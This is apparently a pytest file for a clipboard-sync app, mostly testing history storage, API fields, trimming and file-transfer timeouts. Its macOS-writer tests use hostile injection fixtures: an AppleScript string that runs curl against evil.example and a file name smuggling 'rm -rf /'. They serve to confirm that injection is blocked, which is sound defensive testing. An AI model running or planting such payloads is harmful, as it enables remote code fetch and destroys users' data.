"""Clipboard paths that this machine cannot exercise.

The macOS writer is the one branch of the write path no Windows run reaches, so
the checks here are the ones that matter where it runs: the AppleScript payload
rides in argv and never in the script source, a file name that is not UTF-8
falls back instead of raising, and the history row keeps the fields the API and
the phone's panel read (``image_fmt``, the preview, the route a clip arrived
on) across a reload and a legacy schema.

(merged from test_clipboard_fixes.py)
"""

import os
import sqlite3
import subprocess
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from internal.clipboard import clipboard_darwin as darwin
from internal.clipboard.format import ClipboardContent, ContentType
from internal.clipboard.history_db import ClipboardHistoryDB

# ── #1 osascript argv passing (macOS write fallback) ──────────────────


class _RunCapture:
    """Stand-in for subprocess.run that records every command."""

    def __init__(self):
        self.commands = []

    def __call__(self, cmd, **kwargs):
        self.commands.append(cmd)
        return subprocess.CompletedProcess(cmd, 0)


@pytest.fixture
def run_capture(monkeypatch):
    cap = _RunCapture()
    monkeypatch.setattr(darwin.subprocess, "run", cap)
    return cap


EVIL_URL = '" & do shell script "curl http://evil.example/x" & "'


def test_set_url_never_interpolates_url_into_script(run_capture):
    w = darwin._ClipboardWriter()
    w._set_url(EVIL_URL.encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    # Payload must ride in argv, never appear in the AppleScript source.
    assert EVIL_URL not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    assert cmd[3].startswith(darwin._ARGV_MARK)
    assert cmd[3][1:] == EVIL_URL


def test_set_files_never_interpolates_paths_into_script(run_capture):
    w = darwin._ClipboardWriter()
    paths = [
        '/Users/x/He said "hi".txt',
        "-dash-leading-name.txt",
        '"; do shell script "rm -rf /"; "',
        "/Users/x/正常 文件名.png",
    ]
    w._set_files("\n".join(paths).encode("utf-8"))

    assert len(run_capture.commands) == 1
    cmd = run_capture.commands[0]
    script = cmd[2]
    for p in paths:
        assert p not in script
    assert "do shell script" not in script
    assert script.startswith("on run argv")
    args = cmd[3:]
    assert [a[1:] for a in args] == paths  # marker-prefixed, order preserved


def test_write_atomic_invalid_utf8_file_data_falls_back(monkeypatch):
    # A FILE payload whose bytes are not valid UTF-8 (the 0xb8 opcode byte)
    # used to raise UnicodeDecodeError out of _write_atomic → HTTP 500 on
    # /api/paste-rich. It must fall back to the osascript _set_files path.
    monkeypatch.setattr(darwin, "_init_nspasteboard", lambda: (object(), object()))
    content = ClipboardContent(types={ContentType.FILE: b"bad-\xb8-name"})
    assert darwin._ClipboardWriter()._write_atomic(content) is False


# ── #2 image_fmt exposed through storage and web API ──────────────────


@pytest.fixture
def history_db(tmp_path):
    return ClipboardHistoryDB(
        storage_path=str(tmp_path / "history.db"),
        max_entries=50,
    )


def _bmp_entry(ts=1000.0):
    return ClipboardContent(
        types={ContentType.IMAGE_PNG: b"BM-fake-bmp-bytes"},
        timestamp=ts,
        image_fmt="bmp",
    )


def _text(body: str, ts: float) -> ClipboardContent:
    return ClipboardContent(
        types={ContentType.TEXT: body.encode("utf-8")},
        timestamp=ts,
    )


def test_image_fmt_survives_add_and_reload(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=50)
    db.add(_bmp_entry())
    assert db.get_all()[0]["image_fmt"] == "bmp"

    # A fresh instance (app restart) restores the hint from the DB row.
    db2 = ClipboardHistoryDB(storage_path=path, max_entries=50)
    assert db2.get_all()[0]["image_fmt"] == "bmp"


def test_preview_names_a_link_and_a_file_instead_of_nothing(tmp_path):
    """A URL-only or file-only clip used to store an empty preview.

    `_build_preview` had a branch for text, markup, pictures and rich text and
    nothing else, so a clip whose only format was a link or a dropped file was
    stored with `text_preview = ""` — and every surface that draws a preview
    reads that same field, so the history list, the phone's panel and the
    overview's activity feed all showed such a clip as 无内容.
    """
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=50)
    db.add(ClipboardContent(
        types={ContentType.URL: b"https://example.com/docs/install"},
        timestamp=1000.0,
    ))
    db.add(ClipboardContent(
        types={ContentType.FILE: b"C:/Users/me/Desktop/report.pdf"},
        timestamp=1001.0,
    ))
    # The stored file payload is a newline-separated path list on every platform.
    three = "\n".join(f"C:/x/f{i}.txt" for i in range(3))
    db.add(ClipboardContent(
        types={ContentType.FILE: three.encode("utf-8")},
        timestamp=1002.0,
    ))

    # Newest first, which is the order the history list draws them in.
    previews = [entry["text_preview"] for entry in db.get_all()]
    assert previews == [
        "f0.txt 等 3 个文件",
        "report.pdf",
        "https://example.com/docs/install",
    ]


class _StubCfg:
    device_id = "dev-local"
    device_name = "Local"
    peers = {}
    web_history_limit = 20


def test_api_history_exposes_image_fmt(history_db):
    history_db.add(_bmp_entry())

    from internal.web.api.history import get_history, get_history_item

    payload, status = get_history(history_db, _StubCfg())
    assert status == 200
    item = payload["items"][0]
    assert item["content_type"] == "IMAGE"
    assert item["image_fmt"] == "bmp"

    detail, status = get_history_item(
        {"entry_id": [str(item["entry_id"])]},
        history_db,
        _StubCfg(),
    )
    assert status == 200
    assert detail["item"]["image_fmt"] == "bmp"
    assert detail["item"]["types"]["IMAGE"] == "Qk0tZmFrZS1ibXAtYnl0ZXM="


def _peer_cfg(peer_id="peer-9", peer_name="Phone"):
    from types import SimpleNamespace

    cfg = _StubCfg()
    cfg.peers = {
        peer_id: SimpleNamespace(device_id=peer_id, device_name=peer_name),
    }
    return cfg


def test_api_history_local_clip_source_is_local_device_name(history_db):
    """A clip captured on this machine carries an empty source_device; the API
    must surface the local device name (not 'unknown') in both the list and
    the detail view."""
    from internal.web.api.history import get_history, get_history_item

    cfg = _peer_cfg()
    history_db.add(_text("hello", 1001.0))  # local clip: empty sid

    payload, status = get_history(history_db, cfg)
    assert status == 200
    item = payload["items"][0]
    assert item["source_device"] == ""
    assert item["source_name"] == cfg.device_name  # "Local", not "unknown"

    detail, status = get_history_item({"entry_id": [str(item["entry_id"])]}, history_db, cfg)
    assert status == 200
    assert detail["item"]["source_name"] == cfg.device_name


def test_api_history_ships_the_route_each_clip_arrived_on(history_db):
    """The panel's row names the device; the route is the half of the pair the
    name cannot give, and the panel had no way to learn it at all."""
    from internal.web.api.history import get_history

    for transport, text in (("lan", "cable"), ("relay", "internet"), ("web", "pushed")):
        content = _text(text, 1003.0)
        content.transport = transport
        history_db.add(content)
    history_db.add(_text("typed here", 1004.0))  # captured here: no route at all

    payload, status = get_history(history_db, _StubCfg())
    assert status == 200
    assert [item["transport"] for item in payload["items"]] == ["", "web", "relay", "lan"]


def test_legacy_db_without_image_fmt_column_migrates(tmp_path):
    """A pre-image_fmt database must ALTER-add the column, not fail."""
    path = tmp_path / "old.db"
    conn = sqlite3.connect(str(path))
    conn.execute(
        "CREATE TABLE history ("
        " entry_id INTEGER PRIMARY KEY, timestamp REAL NOT NULL,"
        " content_type TEXT NOT NULL DEFAULT '',"
        " text_preview TEXT NOT NULL DEFAULT '',"
        " types TEXT NOT NULL DEFAULT '{}',"
        " source_device TEXT NOT NULL DEFAULT '',"
        " source_app TEXT NOT NULL DEFAULT '',"
        " source_title TEXT NOT NULL DEFAULT '',"
        " pinned INTEGER NOT NULL DEFAULT 0,"
        " paste_count INTEGER NOT NULL DEFAULT 0)"
    )
    conn.execute(
        "INSERT INTO history (entry_id, timestamp, content_type, text_preview, types)"
        " VALUES (1, 1000.0, 'IMAGE', '[Image]', '{}')"
    )
    conn.commit()
    conn.close()

    db = ClipboardHistoryDB(storage_path=str(path), max_entries=50)
    entry = db.get_all()[0]
    assert entry["text_preview"] == "[Image]"
    assert entry["image_fmt"] == ""  # unknown -> clients fall back to PNG


# ── #3 memory trim aligned with DB trim key ───────────────────────────


def test_memory_trim_matches_db_trim_under_clock_skew(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)

    # The DB stamps local receipt time (not the sender's clock), so these
    # wildly skewed `ts` values must NOT reorder or drive the trim.
    db.add(_text("X", ts=5000.0))  # arrives first
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))
    assert len(db.get_all()) == 3

    db.add(_text("W", ts=1500.0))  # over limit -> trim one

    mem = {e["text_preview"] for e in db.get_all()}
    # Trim keeps the most recent ARRIVALS (W, Z, Y); the skewed timestamps
    # are ignored, so X — the oldest arrival — is the one dropped.
    assert mem == {"W", "Z", "Y"}

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history WHERE pinned = 0")}
    conn.close()
    assert rows == mem  # DB dropped exactly the same entry


def test_memory_trim_preserves_pinned_entries(tmp_path):
    path = str(tmp_path / "history.db")
    db = ClipboardHistoryDB(storage_path=path, max_entries=3)
    db.add(_text("X", ts=5000.0))
    db.add(_text("Y", ts=1000.0))
    db.add(_text("Z", ts=2000.0))

    eid_y = next(e["entry_id"] for e in db.get_all() if e["text_preview"] == "Y")
    assert db.batch_set_pinned([eid_y], True) == 1

    db.add(_text("W", ts=1500.0))  # 4 entries, 1 pinned -> keep top-2 unpinned

    previews = {e["text_preview"] for e in db.get_all()}
    # Local-receipt stamping: the trim keeps pinned Y plus the two most
    # recent ARRIVALS (W, Z); X — the oldest arrival — is the one dropped.
    assert previews == {"W", "Y", "Z"}

    conn = sqlite3.connect(path)
    rows = {r[0] for r in conn.execute("SELECT text_preview FROM history")}
    conn.close()
    assert rows == previews


# ── #4 FILE_COMPLETE wait timeout reason ─────────────────────────────


class TestFileCompleteTimeoutReason:
    def test_completion_wait_timeout_reports_error_timeout(self, tmp_path, monkeypatch):
        from internal.sync import file_transfer as ft_mod
        from internal.sync.file_transfer import FileTransferManager

        monkeypatch.setattr(ft_mod, "COMPLETION_WAIT_TIMEOUT", 1.0)
        # The sender now waits out the receiver's full retransmit window
        # (COMPLETION_WAIT_TIMEOUT + MAX_RETRANSMIT_ROUNDS * RETRANSMIT_TIMEOUT),
        # so shrink RETRANSMIT_TIMEOUT too or the give-up never fires in time.
        monkeypatch.setattr(ft_mod, "RETRANSMIT_TIMEOUT", 0.2)

        mgr = FileTransferManager("test-device", str(tmp_path / "out"))
        completions = []
        mgr.set_on_transfer_complete(
            lambda tid, ok, cancelled, status: completions.append((tid, ok, cancelled, status)),
        )

        f = tmp_path / "hello.bin"
        f.write_bytes(b"x" * 100)
        frames = []
        tid = mgr.send_file(str(f), frames.append)
        mgr.handle_message("file_ack", {"transfer_id": tid}, frames.append)

        deadline = time.time() + 15
        while not completions and time.time() < deadline:
            time.sleep(0.1)

        assert completions, "transfer never completed"
        done_tid, ok, cancelled, status = completions[0]
        assert done_tid == tid
        assert ok is False
        assert cancelled is False
        # A wait timeout is not a dropped connection -- it must not be
        # reported as peer_offline.
        assert status == "error_timeout"
